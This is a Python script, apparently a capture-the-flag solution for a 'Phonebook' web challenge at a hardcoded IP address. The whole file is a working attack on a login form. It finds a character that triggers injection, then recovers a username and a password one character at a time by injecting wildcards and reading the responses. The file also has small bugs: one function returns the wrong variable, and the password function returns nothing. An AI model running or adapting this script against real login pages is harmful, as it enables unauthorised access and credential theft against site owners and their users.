#!/usr/bin/python3

# Phonebook

# Description: Finding SQLi character --> Find a username --> Find a password

import requests
import string

def sqlFind(url, page_login, specials):
    proxies = {
        'http' : 'http://127.0.0.1:8080',
        }

    results = ""

    for i in specials:
        data = {'username':i, 'password':i}

        r = requests.post(url + page_login, data=data, proxies=proxies)
        sc = r.status_code
        if sc == 200 and "Phonebook - Login" in r.text:
            pass
        elif sc == 500:
            pass
        else:
            print(f"[INFO] SQLi char: {i}")
            results = i
            break
    
    return i

def findUsername(url, page_login, sql_char, specials):
    specials.remove(sql_char)
    specials_join = ''.join(specials)

    username_found = ""

    flag = 1
    while flag == 1:
        flag = 0
        for i in string.ascii_letters + string.digits + specials_join:
            user = username_found + i + sql_char

            data = {'username':user, 'password': str(sql_char)}
            
            r = requests.post(url + page_login, data=data)
            sc = r.status_code
            if sc == 200 and "Phonebook - Login" in r.text:
                pass
            elif sc == 500:
                pass
            elif "No search results" in r.text:
                username_found += i
                flag = 1
                #print(username_found)
                break
            else:
                pass

    return username_found

def findPassword(url, page_login, sql_char, sql_username, specials):
    #specials.remove(sql_char)
    specials_join = ''.join(specials)

    password_found = ""

    flag = 1
    while flag == 1:
        flag = 0
        for i in string.ascii_letters + string.digits + specials_join:
            password_iterate = password_found + i + sql_char

            data = {'username':sql_username, 'password': password_iterate}
            
            r = requests.post(url + page_login, data=data)
            sc = r.status_code
            if sc == 200 and "Phonebook - Login" in r.text:
                pass
            elif sc == 500:
                pass
            elif "No search results" in r.text:
                password_found += i
                flag = 1
                print(password_found)
                break
            else:
                pass

if __name__ == '__main__':
    url = "http://206.189.26.62:32244/" 
    page_login = "login"
    
    specials = ['~','!','@','#','*','$','%','^','&','(',')','-','_','+','=','{','}',']','[','|','\\','`',',','.','/','?',';',':',"'",'"','<','>']

    print("[INFO] Finding SQLi character...")
    sql_char = sqlFind(url, page_login, specials)

    print("[INFO] Finding Username...")
    sql_username = findUsername(url, page_login, sql_char, specials)
    print(f"[INFO] Username: {sql_username}")

    print("[INFO] Finding Password...")
    sql_password = findPassword(url, page_login, sql_char, sql_username, specials)
    print(f"[INFO] Password: {sql_password}")
